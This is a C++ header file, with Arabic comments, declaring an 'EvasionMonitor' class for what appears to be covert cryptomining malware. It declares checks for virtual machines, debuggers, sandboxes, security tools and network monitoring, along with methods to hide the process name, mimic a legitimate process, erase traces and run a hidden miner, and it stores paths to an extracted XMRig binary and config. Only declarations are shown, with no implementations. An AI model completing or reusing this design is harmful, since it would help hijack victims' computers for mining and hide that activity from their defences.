#ifndef EVASION_MONITOR_H
#define EVASION_MONITOR_H

#include <string>
#include <vector>

/**
 * فئة متقدمة للتمويه والمراقبة
 * تغطي أساليب إخفاء البصمة المتقدمة المستخدمة في الكود الحقيقي
 */
class EvasionMonitor {
public:
    bool isMonitoringActive();
    bool isVirtualEnvironment();
    bool isDebuggerPresent();
    bool isSecurityToolRunning();
    bool isNetworkMonitored();
    void hideProcessName();
    void cleanupTraces();
    void runHiddenMiner();
    
private:
    bool checkProcessByName(const std::string& processName);
    bool checkVMIndicators();
    bool checkSandboxEnvironment();
    void mimicLegitimateProcess();
    std::vector<std::string> getSecurityProcessList();
    
    // مسارات الملفات المستخرجة
    std::string extractedXMRigPath;
    std::string extractedConfigPath;
};

#endif // EVASION_MONITOR_H
